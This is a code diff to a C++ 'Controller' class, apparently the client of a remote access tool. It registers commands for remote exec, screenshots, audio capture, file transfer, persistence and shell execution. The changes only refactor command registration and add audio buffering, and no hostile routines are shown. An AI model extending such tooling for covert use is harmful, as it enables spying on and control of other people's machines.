@@ -2,6 +2,7 @@
 #include <memory>
 #include <iostream>
 #include <string>
+#include <cstring>
 #include <vector>
 #include <thread>
 #include <cstdint>
@@ -10,6 +11,7 @@
 #include "log.h"
 #include "commands.h"
 #include "simplepacket.h"
+#include "ringbuf.h"
 #include <asio.hpp>
 #include <thread>
 using namespace std;
@@ -22,16 +24,16 @@ using namespace std;
 // boost::lockfree::spsc_queue<char, boost::lockfree::capacity<8192>> audio_buf;
 
 Controller::Controller(string host, uint16_t port) : impl(make_unique<ControllerImpl>(host, port)) {
-	register_command(3, navigation);
-	register_command(4, discordCommand);
+	register_command(NavigationCommand{});
+	register_command(DiscordCommand{});
 	register_command(5, exec);
 	register_command(6, screenshot);
 	register_command(7, audioCommand);
 	register_command(8, downloadFile);
 	register_command(9, uploadFile);
-	register_command(10, persist);
-	register_command(11, dialog);
-	register_command(12, showoff);
+	register_command(PersistCommand{});
+	register_command(DialogCommand{});
+	register_command(ShowoffCommand{});
 	register_command(13, shellExecute);
 }
 
@@ -83,6 +85,12 @@ void Controller::err_println(string err) {
 void Controller::send_buffer(const vector<uint8_t> buf) {
 	SimplePacket<vector<uint8_t>> pkt(3, buf);
 	send_packet(pkt);
+}
+
+void Controller::buffer_audio(const uint8_t* data, size_t len) {
+	ssize_t offset = ringbuf_acquire(impl->audioBufState, impl->audioBufWorker, len);
+	memcpy(&impl->audioBuf[offset], data, len);
+	ringbuf_produce(impl->audioBufState, impl->audioBufWorker);
 }
 
 void Controller::register_type(packettype_t type, function<std::unique_ptr<Packet>(const vector<uint8_t>&)> builder) {
